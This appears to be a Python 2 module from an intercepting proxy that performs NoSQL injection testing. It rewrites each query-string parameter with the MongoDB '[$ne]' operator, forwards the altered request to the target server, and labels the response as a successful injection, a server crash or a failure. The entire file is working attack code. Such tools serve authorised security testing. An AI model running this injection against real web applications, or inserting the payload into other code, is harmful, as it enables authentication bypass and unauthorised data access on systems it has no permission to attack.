import socket, sys
import re

def inject_qs(webserver, port, conn, addr, data, buffer_size):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((webserver, port))
    s.send(data)

    first_line = data.split('\n')[0]
    url = first_line.split(' ')[1]

    while True:
      print '[*] INJECTED URL: %s' % url
      reply = s.recv(buffer_size)

      if (len(reply) > 0):
        first_reply_line = reply.split('\n')[0]
        reply_status_code = first_reply_line.split(' ')[1]
        print '[*] STATUS CODE: %s' % str(reply_status_code)
        if (reply_status_code == '200' or reply_status_code == '302' or reply_status_code == '201'):
          print '[+] INJECTION SUCCESSFUL'
        elif (reply_status_code == '500'):
          print '[+] SERVER CRASHED'
        else:
          print '[-] INJECTION FAILED'
        conn.send(reply)
        dar = float(len(reply))
        dar = float(dar / 1024)
        dar = '%.3s' % (str(dar))
        dar = '%s KB' % (dar)        
        print '[*] Request done: %s => %s <=' % (str(addr[0]), str(dar))
      else:
        break
    s.close()
    conn.close()
  except socket.error, (value, message):
    print '[*] Proxy server error:'
    print '%s %s' % (value, message)
    s.close()
    conn.close()
    sys.exit(2)

def replace_n_occurence(string, sub, wanted, n):
    where = [m.start() for m in re.finditer(sub, string)][n-1]
    before = string[:where]
    after = string[where:]
    after = after.replace(sub, wanted, 1)
    return before + after

def form_queries(webserver, port, conn, addr, data, buffer_size):
  print '\n\n[*] CREATING QUERY STRING INJECTION QUERIES'
  first_line = data.split('\n')[0]
  url = first_line.split(' ')[1]
  plain_url, query_string = url.split('?')
  #params_count = len(query_string.split('=')) - 1

  injected_qs = query_string.replace('=', '[$ne]=')
  injected_query = data.replace(query_string, injected_qs)
  inject_qs(webserver, port, conn, addr, injected_query, buffer_size)